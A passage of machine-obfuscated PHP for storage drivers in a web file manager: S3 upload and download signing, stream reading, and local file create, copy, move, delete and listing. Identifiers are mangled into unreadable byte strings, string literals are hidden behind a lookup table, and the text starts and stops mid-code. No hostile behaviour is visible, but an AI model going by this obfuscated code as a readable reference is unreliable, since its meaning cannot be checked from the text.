$×ÅªæÔ) { break; } } fclose($½Œ); return $ÒÆô; } public function link($»Çµ¤¥Ôóòë¼, $ƒÚÕ‹ÌÓÜí‡ = '') { if (!$this->isFile($»Çµ¤¥Ôóòë¼)) { return !1; } $âŒãéèÍä = $this->getHost() . $_SERVER[ÀÆ][8] . $this->pathEncode($»Çµ¤¥Ôóòë¼) . $ƒÚÕ‹ÌÓÜí‡; return $this->auth->privateDownloadUrl($âŒãéèÍä, 3600 * 12); } public function fileOut($¶Í…¼, $‰è¨Ë®øÊÂá = false, $úÏ¢ = false, $»¸îäÏ = '') { $ÔËÔ =& $_SERVER[ÀÆ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¶Í…¼, $‰è¨Ë®øÊÂá, $úÏ¢, $»¸îäÏ); } if (!$úÏ¢) { $úÏ¢ = $this->pathThis($¶Í…¼); } $‘¤Ÿ…öï = $‰è¨Ë®øÊÂá ? $ÔËÔ[1359] . rawurlencode($úÏ¢) : $ÔËÔ[33]; $¢ó¾Šô‚Î = $this->link($¶Í…¼, $‘¤Ÿ…öï); $this->fileOutLink($¢ó¾Šô‚Î); } public function fileOutServer($œ„ÜºÙ½¤Õø, $ùÉÀ–² = false, $½® = false, $‰›ˆÒéÜò¡† = '') { parent::fileOut($œ„ÜºÙ½¤Õø, $ùÉÀ–², $½®, $‰›ˆÒéÜò¡†); } public function fileOutImage($–À, $‡ÄŞ¿ = 250) { $Øğô´Òç„²ëÁ = $this->link($–À, $_SERVER[ÀÆ][1360] . $‡ÄŞ¿); $this->fileOutLink($Øğô´Òç„²ëÁ); } public function fileOutImageServer($õçİˆ•, $ìÊ = 250) { parent::fileOutImage($õçİˆ•, $ìÊ); } public function hashMd5($ÜÉÅñ) { $× ›ğİœç°» =& $_SERVER[ÀÆ]; $ÊÏ› = $this->objectMeta($ÜÉÅñ); return isset($ÊÏ›[$× ›ğİœç°»[208]]) ? $ÊÏ›[$× ›ğİœç°»[208]] : !1; $Ë®õ‚Ë = $this->link($ÜÉÅñ, $× ›ğİœç°»[1361]); } public function size($ÜÂñÆ) { $ÛåõËæ…´Á¬ñ = $this->objectMeta($ÜÂñÆ); return $ÛåõËæ…´Á¬ñ ? $ÛåõËæ…´Á¬ñ[$_SERVER[ÀÆ][78]] : 0; } public function info($©ñïÈ«) { if ($this->isFolder($©ñïÈ«)) { return $this->folderInfo($©ñïÈ«); } else { if ($this->isFile($©ñïÈ«)) { return $this->fileInfo($©ñïÈ«); } } return !1; } public function exist($ä) { return $this->isFile($ä) || $this->isFolder($ä); } public function isFile($‰¡ˆ¢¿ôæŸ) { return !$this->isFolder($‰¡ˆ¢¿ôæŸ) && $this->objectMeta($‰¡ˆ¢¿ôæŸ); } public function isFolder($ÔÁº±İ½ÁƒŞ²) { return $this->cacheMethod($_SERVER[ÀÆ][199], $ÔÁº±İ½ÁƒŞ²); } protected function objectMeta($İÚÇ) { return $this->cacheMethod($_SERVER[ÀÆ][200], $İÚÇ); } protected function _objectMeta($ÏúÍÚ’ğ) { $€û¸ù®ŞŠ =& $_SERVER[ÀÆ]; list($Ôöí·, $ï‘Úìú„Ñ½Ùœ) = $this->bucketManager->stat($this->bucket, $ÏúÍÚ’ğ); if ($Ôöí·) { $Ôöí·[$€û¸ù®ŞŠ[78]] = intval($Ôöí·[$€û¸ù®ŞŠ[1347]]); } return $Ôöí·; } protected function _isFolder($’Ÿ¯) { $œè•š‚›À‹ =& $_SERVER[ÀÆ]; if ($’Ÿ¯ == $œè•š‚›À‹[33] || $’Ÿ¯ == $œè•š‚›À‹[8]) { return !0; } list($‚œ‹’ œğÂ, $‹€¿¿º§İ‡É) = $this->bucketManager->listFiles($this->bucket, trim($’Ÿ¯, $œè•š‚›À‹[8]) . $œè•š‚›À‹[8], $œè•š‚›À‹[33], 1, $œè•š‚›À‹[8]); return !empty($‚œ‹’ œğÂ[$œè•š‚›À‹[1350]]) || !empty($‚œ‹’ œğÂ[$œè•š‚›À‹[1351]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($î¯ì»Ôø) { parent::__construct($î¯ì»Ôø); } public function uploadFormData($±Î, $¶¡éÀÛ­ = 3600) { $ıÀíÃ ê°•Œ =& $_SERVER[ÀÆ]; $Ï–¡ = $ıÀíÃ ê°•Œ[192]; $™É“£¥ó = $ıÀíÃ ê°•Œ[1268]; $”„©ãÎ†½Ì´ = $ıÀíÃ ê°•Œ[59]; $Ã¬ş = gmdate($ıÀíÃ ê°•Œ[1269]); $ÄÛòìÌá† = gmdate($ıÀíÃ ê°•Œ[736]); $ï—× = $ıÀíÃ ê°•Œ[1270]; $¶°¥ÅÆçò = $¶¡éÀÛ­ . $ıÀíÃ ê°•Œ[33]; $íàğ = $ıÀíÃ ê°•Œ[1233]; $·ë˜· = array($this->accessKey, $ÄÛòìÌá†, $this->region, $”„©ãÎ†½Ì´, $ï—×); $óƒ = implode($ıÀíÃ ê°•Œ[8], $·ë˜·); $®­Ö¢ = array($ıÀíÃ ê°•Œ[1235] => gmdate($ıÀíÃ ê°•Œ[1234], strtotime($ıÀíÃ ê°•Œ[1271])), $ıÀíÃ ê°•Œ[1236] => array(array($ıÀíÃ ê°•Œ[1238] => $this->bucket), array($ıÀíÃ ê°•Œ[1237] => $Ï–¡), array($ıÀíÃ ê°•Œ[1239], $ıÀíÃ ê°•Œ[1240], $ıÀíÃ ê°•Œ[33]), array($ıÀíÃ ê°•Œ[1239], $ıÀíÃ ê°•Œ[1272], $ıÀíÃ ê°•Œ[33]), array($ıÀíÃ ê°•Œ[1239], $ıÀíÃ ê°•Œ[1273], $ıÀíÃ ê°•Œ[33]), array($ıÀíÃ ê°•Œ[1241] => $íàğ), array($ıÀíÃ ê°•Œ[1274] => $óƒ), array($ıÀíÃ ê°•Œ[1275] => $™É“£¥ó), array($ıÀíÃ ê°•Œ[1276] => $Ã¬ş), array($ıÀíÃ ê°•Œ[1277] => $¶°¥ÅÆçò))); $Îí¤¾ = base64_encode(json_encode($®­Ö¢)); $âÙ = hash_hmac($ıÀíÃ ê°•Œ[1278], $ÄÛòìÌá†, $ıÀíÃ ê°•Œ[1279] . $this->secret, !0); $´ì = hash_hmac($ıÀíÃ ê°•Œ[1278], $this->region, $âÙ, !0); $„Ã›†İ = hash_hmac($ıÀíÃ ê°•Œ[1278], $”„©ãÎ†½Ì´, $´ì, !0); $·õ›ˆ’òÀ‚‰ = hash_hmac($ıÀíÃ ê°•Œ[1278], $ï—×, $„Ã›†İ, !0); $ï­ïÙÄ = hash_hmac($ıÀíÃ ê°•Œ[1278], $Îí¤¾, $·õ›ˆ’òÀ‚‰); $¼Àãâ˜ÄÊ = array($ıÀíÃ ê°•Œ[211] => $ıÀíÃ ê°•Œ[33], $ıÀíÃ ê°•Œ[1280] => $ıÀíÃ ê°•Œ[33], $ıÀíÃ ê°•Œ[1237] => $Ï–¡, $ıÀíÃ ê°•Œ[1241] => $íàğ, $ıÀíÃ ê°•Œ[1245] => $Îí¤¾, $ıÀíÃ ê°•Œ[1281] => $óƒ, $ıÀíÃ ê°•Œ[1282] => $™É“£¥ó, $ıÀíÃ ê°•Œ[1283] => $Ã¬ş, $ıÀíÃ ê°•Œ[1284] => $¶°¥ÅÆçò, $ıÀíÃ ê°•Œ[1285] => $ï­ïÙÄ, $ıÀíÃ ê°•Œ[175] => $this->getHost()); return $¼Àãâ˜ÄÊ; } public function multiUploadFormData($¬·ËîÒƒ—, $ê´ˆæá— = 3600) { $üÜ =& $_SERVER[ÀÆ]; $©¿èÛ = gmdate($üÜ[1362]); $°èÆ = array(); $Êûô»» = $this->client->getUploadId($this->bucket, $¬·ËîÒƒ—, $°èÆ); if (!$Êûô»») { return !1; } return array($üÜ[221] => $Êûô»», $üÜ[175] => $this->getHost() . $üÜ[8] . $this->pathEncode($¬·ËîÒƒ—), $üÜ[222] => $©¿èÛ, $üÜ[93] => $¬·ËîÒƒ—); } public function multiUploadAuthData($ƒ¥, $×Ë“²—Âª = array()) { $®É =& $_SERVER[ÀÆ]; $‰ù­õê = isset($×Ë“²—Âª[$®É[168]]) ? $×Ë“²—Âª[$®É[168]] : $®É[33]; $º£ = $×Ë“²—Âª[$®É[93]]; unset($×Ë“²—Âª[$®É[93]]); if (isset($×Ë“²—Âª[$®É[223]])) { return $this->listUploadParts($º£, $×Ë“²—Âª); } $ï©æºÒ æò = array(); if (isset($×Ë“²—Âª[$®É[1363]])) { $ï©æºÒ æò[$®É[1364]] = $×Ë“²—Âª[$®É[1363]]; } $›¤‹£¡ä‘„ = explode($®É[177], $this->getHost()); $‹‚ÑØÊ = array($®É[1365] => $›¤‹£¡ä‘„[1], $®É[1366] => $®É[33], $®É[211] => $®É[119], $®É[1280] => $×Ë“²—Âª[$®É[78]]); $ÃÈ© = $®É[226]; $÷ßŸù§ = $®É[8] . $this->pathEncode($º£) . $‰ù­õê; $…ç¼§ = $this->client->__getSignatureV4($ï©æºÒ æò, $‹‚ÑØÊ, $ÃÈ©, $÷ßŸù§); if (strpos($‰ù­õê, $®É[225]) === 0) { if (isset($ï©æºÒ æò[$®É[1364]])) { $›çÑ”Çí™ = $ï©æºÒ æò[$®É[1364]]; } else { if (isset($…ç¼§[$®É[1364]])) { $›çÑ”Çí™ = $…ç¼§[$®É[1364]]; } else { $›çÑ”Çí™ = hash($®É[1278], $®É[33]); } } return array($®É[232] => $…ç¼§[$®É[232]], $®É[1364] => $›çÑ”Çí™, $®É[222] => $…ç¼§[$®É[1367]]); } return $…ç¼§[$®É[232]]; } public function listUploadParts($œ®¢ïª†Ó¡, $š È = array()) { $µßÑÎ‹ =& $_SERVER[ÀÆ]; $«ôöºªª–ù”ã = str_replace($µßÑÎ‹[233], $µßÑÎ‹[33], $š È[$µßÑÎ‹[168]]); $ä•· = $this->client->listParts($this->bucket, $œ®¢ïª†Ó¡, $«ôöºªª–ù”ã); if (!$ä•·) { return !1; } $¨¬¡Ô¨§²™ = $µßÑÎ‹[1368]; foreach ($ä•· as $ŞœŒ¸) { $¨¬¡Ô¨§²™ .= $µßÑÎ‹[1369] . "\x3c\x50\x61\x72\164\x4e\x75\x6d\142\145\162\76{$ŞœŒ¸[$µßÑÎ‹[1325]]}\x3c\57\x50\141\162\164\116\165\155\142\x65\162\76\xa" . "\74\105\124\x61\147\76{$ŞœŒ¸[$µßÑÎ‹[1326]]}\x3c\57\105\x54\141\147\x3e\12" . $µßÑÎ‹[1370]; } $¨¬¡Ô¨§²™ .= $µßÑÎ‹[1371]; $¦ÃĞĞŒäñ = array(); $Ô–ìß»¡‚†¼ = explode($µßÑÎ‹[177], $this->getHost()); $éÒêëÂ¬„‚¹ã = array($µßÑÎ‹[1365] => $Ô–ìß»¡‚†¼[1], $µßÑÎ‹[211] => $µßÑÎ‹[119], $µßÑÎ‹[1280] => strlen($¨¬¡Ô¨§²™)); $ƒø­–úï = $µßÑÎ‹[224]; $±ƒå¢Õ = $µßÑÎ‹[8] . $this->pathEncode($œ®¢ïª†Ó¡) . $š È[$µßÑÎ‹[168]]; $Ô’ƒåçş“­±ë = $this->client->__getSignatureV4($¦ÃĞĞŒäñ, $éÒêëÂ¬„‚¹ã, $ƒø­–úï, $±ƒå¢Õ, $¨¬¡Ô¨§²™); return array($µßÑÎ‹[232] => $Ô’ƒåçş“­±ë[$µßÑÎ‹[232]], $µßÑÎ‹[222] => $Ô’ƒåçş“­±ë[$µßÑÎ‹[1367]], $µßÑÎ‹[234] => $ä•·, $µßÑÎ‹[1364] => $Ô’ƒåçş“­±ë[$µßÑÎ‹[1364]]); } public function link($ØéåÌ, $Ä–º» = array()) { return parent::link($ØéåÌ, $Ä–º»); } public function fileOut($œ©, $ÒäÔŒóİ«ñĞš = false, $ñ˜ÂÓì× = false, $Ù = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ÀÆ][1372])) { return parent::fileOutServer($œ©, $ÒäÔŒóİ«ñĞš, $ñ˜ÂÓì×, $Ù); } parent::fileOut($œ©, $ÒäÔŒóİ«ñĞš, $ñ˜ÂÓì×, $Ù); } public function fileOutImage($Å‰°©ú, $¿Ùà²ñÅ” = 250) { if (strstr($this->endpoint, $_SERVER[ÀÆ][1372])) { return parent::fileOutImageServer($Å‰°©ú, $¿Ùà²ñÅ”); } parent::fileOutImage($Å‰°©ú, $¿Ùà²ñÅ”); } public function fileOutLink($ÙÏ±®©ÚŠğ§) { $¢“˜Ó×ğ =& $_SERVER[ÀÆ]; if (substr($ÙÏ±®©ÚŠğ§, 0, 7) == $¢“˜Ó×ğ[1248]) { $ÙÏ±®©ÚŠğ§ = $¢“˜Ó×ğ[1249] . substr($ÙÏ±®©ÚŠğ§, 7); } header($¢“˜Ó×ğ[159] . $ÙÏ±®©ÚŠğ§); die; } public function getHost() { $§‹³Å‘áè =& $_SERVER[ÀÆ]; $†¥¿§×„ = str_rtrim(parent::getHost(), $§‹³Å‘áè[8] . $this->bucket); $†¥¿§×„ = explode($§‹³Å‘áè[177], $†¥¿§×„); return $†¥¿§×„[0] . $§‹³Å‘áè[177] . $this->bucket . $§‹³Å‘áè[95] . $†¥¿§×„[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Š¬çÛ, $‘º‚¾€—‘­ı = 0) { parent::__construct(); $this->source = $Š¬çÛ; $this->sourceSize = $‘º‚¾€—‘­ı; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($éæµ¥¼Ã = false) { return $this->sourceSize; } public function getContent($ıö”ˆùÍÈ = false) { return $this->fileSubstr($ıö”ˆùÍÈ, 0, $this->sourceSize); } public function fileSubstr($„Œ¹¬Øšİ÷Ô = false, $Õ«ÙÈí÷ğ• = 0, $ÕÕ = 0) { if (!$ÕÕ) { $ÕÕ = $this->sourceSize; } $Ú†¤Ü¦ß…µ = $this->sourceSize - $Õ«ÙÈí÷ğ•; if ($ÕÕ >= $Ú†¤Ü¦ß…µ) { $ÕÕ = $Ú†¤Ü¦ß…µ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Õ«ÙÈí÷ğ•, $ÕÕ); } if ($this->sourceType == self::TYPE_FILE) { if ($ÕÕ <= 0) { return $_SERVER[ÀÆ][33]; } $ÅÚ° °“ = ftell($this->source); fseek_64($this->source, $ÅÚ° °“ + $Õ«ÙÈí÷ğ•); $©Ì = @fread($this->source, $ÕÕ); fseek_64($this->source, $ÅÚ° °“); return $©Ì; } } public function hashMd5($Œš“ÀèÄõ = false) { return md5($this->getContent()); } public static function hash($Ñ›–À´æ×, $µÏ¿Æé—Ê = 0) { $ª÷ıÂ¹ò½‡€ = new PathDriverStream($Ñ›–À´æ×, $µÏ¿Æé—Ê); return $ª÷ıÂ¹ò½‡€->hashSimple($Ñ›–À´æ×); } public static function md5($°ö¸Ëöò²Èæ, $¤ë˜ = 0) { $àÎ = new PathDriverStream($°ö¸Ëöò²Èæ, $¤ë˜); return $àÎ->hashMd5($°ö¸Ëöò²Èæ); } } goto f£ŒİŞØœ³; EÏ¶ˆ’: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ñ×¥) { if (substr($ñ×¥, 0, 2) == $_SERVER[ÀÆ][1289]) { $ñ×¥ = BASIC_PATH . substr($ñ×¥, 2); } return $ñ×¥; } public function iconvApp($ìĞ¹¯) { $á’Ò =& $_SERVER[ÀÆ]; global $config; return $this->iconvTo($ìĞ¹¯, $config[$á’Ò[1287]], $config[$á’Ò[1286]]); } public function iconvSystem($áöîÎ‘‰è) { $â…æÔÀøÖ´± =& $_SERVER[ÀÆ]; global $config; return $this->iconvTo($áöîÎ‘‰è, $config[$â…æÔÀøÖ´±[1286]], $config[$â…æÔÀøÖ´±[1287]]); } public function getPathOuter($‹å÷ÑÇ¹ŠàÅ) { $··ßğûæ‹ =& $_SERVER[ÀÆ]; $ÙŸâà„ÊÖÛğ = $this->iconvApp($this->pathBase); $‹å÷ÑÇ¹ŠàÅ = $this->iconvApp($‹å÷ÑÇ¹ŠàÅ); if (substr($ÙŸâà„ÊÖÛğ, 0, 2) == $··ßğûæ‹[1289]) { $ÙŸâà„ÊÖÛğ = BASIC_PATH . substr($ÙŸâà„ÊÖÛğ, 2); } if (substr($‹å÷ÑÇ¹ŠàÅ, 0, 2) == $··ßğûæ‹[1289]) { $‹å÷ÑÇ¹ŠàÅ = BASIC_PATH . substr($‹å÷ÑÇ¹ŠàÅ, 2); } $ÙŸâà„ÊÖÛğ = KodIO::clear($ÙŸâà„ÊÖÛğ); $‹å÷ÑÇ¹ŠàÅ = KodIO::clear($‹å÷ÑÇ¹ŠàÅ); $‹å÷ÑÇ¹ŠàÅ = substr($‹å÷ÑÇ¹ŠàÅ, strlen($ÙŸâà„ÊÖÛğ)); if (empty($this->pathDriver)) { return $‹å÷ÑÇ¹ŠàÅ; } return $this->pathDriver . $··ßğûæ‹[8] . ltrim($‹å÷ÑÇ¹ŠàÅ, $··ßğûæ‹[8]); } public function mkfile($¾·, $ğØö = '', $ØºÄô¬¯™Ãï = REPEAT_RENAME) { $¾· = $this->iconvSystem($¾·); @touch($¾·); if ($ğØö) { file_put_contents($¾·, $ğØö); } @chmod($¾·, $this->pathAuth); return is_file($¾·) ? $this->getPathOuter($¾·) : !1; } public function mkdir($şæ€¥”‚Û, $§— = REPEAT_SKIP) { $şæ€¥”‚Û = $this->iconvSystem($şæ€¥”‚Û); if (is_dir($şæ€¥”‚Û)) { return $this->getPathOuter($şæ€¥”‚Û); } @mkdir($şæ€¥”‚Û, $this->pathAuth, !0); @chmod($şæ€¥”‚Û, $this->pathAuth); return is_dir($şæ€¥”‚Û) ? $this->getPathOuter($şæ€¥”‚Û) : !1; } public function copyFile($š½ê÷æ“ó, $˜´) { $this->mkdir($this->pathFather($˜´)); $š½ê÷æ“ó = $this->iconvSystem($š½ê÷æ“ó); $˜´ = $this->iconvSystem($˜´); $«Ú­š‰ş¡ = copy_64($š½ê÷æ“ó, $˜´); @chmod($˜´, $this->pathAuth); return $«Ú­š‰ş¡ ? $this->getPathOuter($˜´) : !1; } public function moveFile($ÊÒ¤Ää“§, $¬¹ˆÛŞ) { $this->mkdir($this->pathFather($¬¹ˆÛŞ)); $ÊÒ¤Ää“§ = $this->iconvSystem($ÊÒ¤Ää“§); $¬¹ˆÛŞ = $this->iconvSystem($¬¹ˆÛŞ); $•Í½ú‘ = intval(@rename($ÊÒ¤Ää“§, $¬¹ˆÛŞ)); if (!$•Í½ú‘) { if ($•Í½ú‘ = intval(@copy_64($ÊÒ¤Ää“§, $¬¹ˆÛŞ))) { @unlink($ÊÒ¤Ää“§); } } @chmod($¬¹ˆÛŞ, $this->pathAuth); return $•Í½ú‘ ? $this->getPathOuter($¬¹ˆÛŞ) : !1; } public function delFile($İ…) { $İ… = $this->iconvSystem($İ…); if (!@unlink($İ…)) { @chmod($İ…, $this->pathAuth); if (!@unlink($İ…)) { return !1; } } else { return !0; } } public function delFolder($ß½ä½×’½ÚŞƒ) { $ÉÁÕ˜• =& $_SERVER[ÀÆ]; $ß½ä½×’½ÚŞƒ = $this->iconvSystem($ß½ä½×’½ÚŞƒ); if (!is_dir($ß½ä½×’½ÚŞƒ)) { return !0; } if (!($áÄ = opendir($ß½ä½×’½ÚŞƒ))) { return !1; } while (($·¾Íøº¿›– = readdir($áÄ)) !== !1) { if ($·¾Íøº¿›– == $ÉÁÕ˜•[95] || $·¾Íøº¿›– == $ÉÁÕ˜•[1296]) { continue; } $Ÿü­© » = $ß½ä½×’½ÚŞƒ . $ÉÁÕ˜•[8] . $·¾Íøº¿›–; if (is_file($Ÿü­© ») || is_link($Ÿü­© »)) { if (!unlink($Ÿü­© »)) { chmod($Ÿü­© », $this->pathAuth); if (!unlink($Ÿü­© »)) { return !1; } } } else { if (is_dir($Ÿü­© »)) { chmod($Ÿü­© », $this->pathAuth); $Ÿü­© » = $this->iconvApp($Ÿü­© »); if (!$this->delFolder($Ÿü­© »)) { return !1; } } } } closedir($áÄ); return rmdir($ß½ä½×’½ÚŞƒ); } public function rename($è®³½ÓÖ±è, $šÕ€Ñ¦Ã¦Ä¯) { $ïğ˜õ =& $_SERVER[ÀÆ]; $îÍÂĞ”’Ãú… = $this->fileNameAuto($this->pathFather($è®³½ÓÖ±è), $šÕ€Ñ¦Ã¦Ä¯); $îÍÂĞ”’Ãú… = $this->iconvSystem($îÍÂĞ”’Ãú…); $è®³½ÓÖ±è = $this->iconvSystem($è®³½ÓÖ±è); $œÔâ—ê = $this->pathFather($è®³½ÓÖ±è); $ Ÿ”Ù½ = rtrim($œÔâ—ê, $ïğ˜õ[8]) . $ïğ˜õ[8] . $îÍÂĞ”’Ãú…; $ˆ·äÏ = @rename($è®³½ÓÖ±è, $ Ÿ”Ù½); $ Ÿ”Ù½ = $this->iconvApp($ Ÿ”Ù½); return $ˆ·äÏ ? $this->getPathOuter($ Ÿ”Ù½) : !1; } public function size($é¡¥˜Á) { $é¡¥˜Á = $this->iconvSystem($é¡¥˜Á); return filesize_64($é¡¥˜Á); } public function info($ëŠ¿º) { $ëŠ¿º = $this->iconvSystem($ëŠ¿º); if ($this->isFolder($ëŠ¿º)) { return $this->folderInfo($ëŠ¿º); } else { if ($this->isFile($ëŠ¿º)) { return $this->fileInfo($ëŠ¿º); } } return !1; } protected function infoChildren($ÀğÎŞÔ²·¼, &$”º·š¯ØÍÖ, $Â¢ˆ = true) { $úğĞà =& $_SERVER[ÀÆ]; check_abort_echo(); $ÀğÎŞÔ²·¼ = rtrim($ÀğÎŞÔ²·¼, $úğĞà[8]) . $úğĞà[8]; if ($Â¢ˆ) { $ÀğÎŞÔ²·¼ = $this->iconvSystem($ÀğÎŞÔ²·¼); } if (!($Ëïª‚æ¾ƒ = @opendir($ÀğÎŞÔ²·¼))) { return; } while (($•ş = readdir($Ëïª‚æ¾ƒ)) !== !1) { if ($•ş == $úğĞà[95] || $•ş == $úğĞà[1296]) { continue; } $Í­·âğÀ¶Êê = $ÀğÎŞÔ²·¼ . $•ş; if (is_file($Í­·âğÀ¶Êê) || is_link($Í­·âğÀ¶Êê)) { $”º·š¯ØÍÖ[$úğĞà[79]]++; $”º·š¯ØÍÖ[$úğĞà[78]] += filesize_64($Í­·âğÀ¶Êê); } else { if (is_dir($Í­·âğÀ¶Êê)) { $”º·š¯ØÍÖ[$úğĞà[80]]++; $this->infoChildren($Í­·âğÀ¶Êê, $”º·š¯ØÍÖ, !1); } } } closedir($Ëïª‚æ¾ƒ); } private function folderInfo($ÍÕËÊ, $‡·Øœµ = false) { $•ñ‘ =& $_SERVER[ÀÆ]; $ÍÕËÊ = rtrim($ÍÕËÊ, $•ñ‘[8]) . $•ñ‘[8]; $¶˜¶š = $this->iconvApp($this->pathThis($ÍÕËÊ)); if ($‡·Øœµ) { return array($•ñ‘[28] => $¶˜¶š, $•ñ‘[76] => $this->getPathOuter($ÍÕËÊ), $•ñ‘[29] => $•ñ‘[77]); } $ø·…„İˆöÚ´ = array($•ñ‘[28] => $¶˜¶š, $•ñ‘[76] => $this->getPathOuter($ÍÕËÊ), $•ñ‘[29] => $•ñ‘[77], $•ñ‘[194] => @filectime($ÍÕËÊ), $•ñ‘[84] => @filemtime($ÍÕËÊ), $•ñ‘[1299] => @fileatime($ÍÕËÊ), $•ñ‘[1300] => is_readable($ÍÕËÊ), $•ñ‘[1301] => is_writable($ÍÕËÊ), $•ñ‘[1302] => get_mode($ÍÕËÊ)); return $ø·…„İˆöÚ´; } private function fileInfo($û»…«í¢ğ“, $‘ÕôÖğ¥ÅÒ‡æ = false) { $”™«æ =& $_SERVER[ÀÆ]; $Ñ‡‰ = $this->iconvApp($this->pathThis($û»…«í¢ğ“)); if ($‘ÕôÖğ¥ÅÒ‡æ) { return array($”™«æ[28] => $Ñ‡‰, $”™«æ[76] => $this->getPathOuter($û»…«í¢ğ“), $”™«æ[29] => $”™«æ[193], $”™«æ[78] => $this->size($û»…«í¢ğ“), $”™«æ[168] => $this->ext($Ñ‡‰)); } $¯™Œ§ = array($”™«æ[28] => $Ñ‡‰, $”™«æ[76] => $this->getPathOuter($û»…«í¢ğ“), $”™«æ[29] => $”™«æ[193], $”™«æ[194] => @filectime($û»…«í¢ğ“), $”™«æ[84] => @filemtime($û»…«í¢ğ“), $”™«æ[1299] => @fileatime($û»…«í¢ğ“), $”™«æ[78] => $this->size($û»…«í¢ğ“), $”™«æ[168] => $this->ext($Ñ‡‰), $”™«æ[1300] => is_readable($û»…«í¢ğ“), $”™«æ[1301] => is_writable($û»…«í¢ğ“), $”™«æ[1302] => get_mode($û»…«í¢ğ“)); return $¯™Œ§; } public function exist($Ú½Ëí) { $Ú½Ëí = $this->iconvSystem($Ú½Ëí); return @file_exists($Ú½Ëí); } public function isFile($††òİ) { $††òİ = $this->iconvSystem($††òİ); return @is_file($††òİ); } public function isFolder($­şšÈô) { $­şšÈô = $this->iconvSystem($­şšÈô); return @is_dir($­şšÈô); } public function listPath($éÍ²Ê¹, $Ø†¥ÛÒ = false) { $«‚¹ˆ =& $_SERVER[ÀÆ]; $éÍ²Ê¹ = $this->iconvSystem($éÍ²Ê¹); $éÍ²Ê¹ = rtrim($éÍ²Ê¹, $«‚¹ˆ[8]) . $«‚¹ˆ[8]; $™… = array($«‚¹ˆ[75] => array(), $«‚¹ˆ[74] => array()); if (!($‹·¦¥”èÙ¢ = @opendir($éÍ²Ê¹))) { return $™…; } while (($Î‘ª¡¨ˆáİ = readdir($‹·¦¥”èÙ¢)) !== !1) { if ($Î‘ª¡¨ˆáİ == $«‚¹ˆ[95] || $Î‘ª¡¨ˆáİ == $«‚¹ˆ[1296]) { continue; } $îÕ™ˆî” = $éÍ²Ê¹ . $Î‘ª¡¨ˆáİ; if (is_file($îÕ™ˆî”)) { $™…[$«‚¹ˆ[74]][] = $this->fileInfo($îÕ™ˆî”, $Ø†¥ÛÒ); } else { $™…[$«‚¹ˆ[75]][] = $this->folderInfo($îÕ™ˆî”, $Ø†¥ÛÒ); } } closedir($‹·¦¥”èÙ¢); return $™…; } public function listAll($ë”¦åü, &$ê¬› = array()) { $¼Éù”§Åí¢…Ê =& $_SERVER[ÀÆ]; $ë”¦åü = $this->iconvSystem($ë”¦åü); $ë”¦åü = rtrim($ë”¦åü, $¼Éù”§Åí¢…Ê[8]) . $¼Éù”§Åí¢…Ê[8]; if (!($Åî¤ûÖĞ‡å½Ú = @opendir($ë”¦åü))) { return $ê¬›; } while (($’äÀØüË¶ıë‡ = readdir($Åî¤ûÖĞ‡å½Ú)) !== !1) { if ($’äÀØüË¶ıë‡ == $¼Éù”§Åí¢…Ê[95] || $’äÀØüË¶ıë‡ == $¼Éù”§Åí¢…Ê[1296]) { continue; } $œÊ¡Õ™Ã¯à‡ = $ë”¦åü . $’äÀØüË¶ıë‡; if (is_dir($œÊ¡Õ™Ã¯à‡) && !is_link($œÊ¡Õ™Ã¯à‡)) { $ê¬›[] = array($¼Éù”§Åí¢…Ê[76] => $œÊ¡Õ™Ã¯à‡ . $¼Éù”§Åí¢…Ê[8], $¼Éù”§Åí¢…Ê[77] => 1, $¼Éù”§Åí¢…Ê[84] => @filemtime($œÊ¡Õ™Ã¯à‡), $¼Éù”§Åí¢…Ê[78] => 0); $this->listAll($œÊ¡Õ™Ã¯à‡, $ê¬›); } else { $ê¬›[] = array($¼Éù”§Åí¢…Ê[76] => $œÊ¡Õ™Ã¯à‡, $¼Éù”§Åí¢…Ê[77] => 0, $¼Éù”§Åí¢…Ê[84] => @filemtime($œÊ¡Õ™Ã¯à‡), $¼Éù”§Åí¢…Ê[78] => $this->size($œÊ¡Õ™Ã¯à‡)); } } closedir($Åî¤ûÖĞ‡å½Ú); return $ê¬›; } public function has($´¸„³½»»Õ, $®Û• = false, $«Ÿ¦˜ä­÷ = true) { $ƒÊ¥ =& $_SERVER[ÀÆ]; $´¸„³½»»Õ = $this->iconvSystem($´¸„³½»»Õ); $´¸„³½»»Õ = rtrim($´¸„³½»»Õ, $ƒÊ¥[8]) . $ƒÊ¥[8]; if (!($Ñò‹Ú›©ê = @opendir($´¸„³½»»Õ))) { return !1; } $Ş…‹’„÷íŒË‰ = 0; $ı·œ = 0; $Ï±ßò = 0; while (($Åæôêôê‰®â = readdir($Ñò‹Ú›©ê)) !== !1) { if ($Åæôêôê‰®â == $ƒÊ¥[95] || $Åæôêôê‰®â == $ƒÊ¥[1296]) { continue; } $ÏÏäŸ³ğØ = $´¸„³½»»Õ . $Åæôêôê‰®â; if ($®Û•) { $Ï±ßò++; if (@is_file($ÏÏäŸ³ğØ)) { $Ş…‹’„÷íŒË‰++; } else { $ı·œ++; } if ($Ï±ßò > 10000) { break; } continue; } if ($«Ÿ¦˜ä­÷) { if (@is_file($ÏÏäŸ³ğØ)) { return !0; } } else { if (@is_dir($ÏÏäŸ³ğØ . $ƒÊ¥[8])) { return !0; } } } closedir($Ñò‹Ú›©ê); if ($®Û•) { return array($ƒÊ¥[203] => $Ş…‹’„÷íŒË‰, $ƒÊ¥[204] => $ı·œ); } return !1; } public function hashSimple($ÏÌ“•ªªê–) { $ëğµ =& $_SERVER[ÀÆ]; if (!$ÏÌ“•ªªê–) { return md5($ëğµ[33]); } $ÏÌ“•ªªê– = $this->iconvSystem($ÏÌ“•ªªê–); $Ø…ôÓÄ = $this->size($ÏÌ“•ªªê–); $æ³ = 200; $©¤ = 50; if ($Ø…ôÓÄ <= $æ³ * $©¤) { return $this->hashMd5($ÏÌ“•ªªê–) . $Ø…ôÓÄ; } $ªÌÜ£¿Ó®ïŞ– = $ëğµ[33]; $ª¨ßĞÔ = 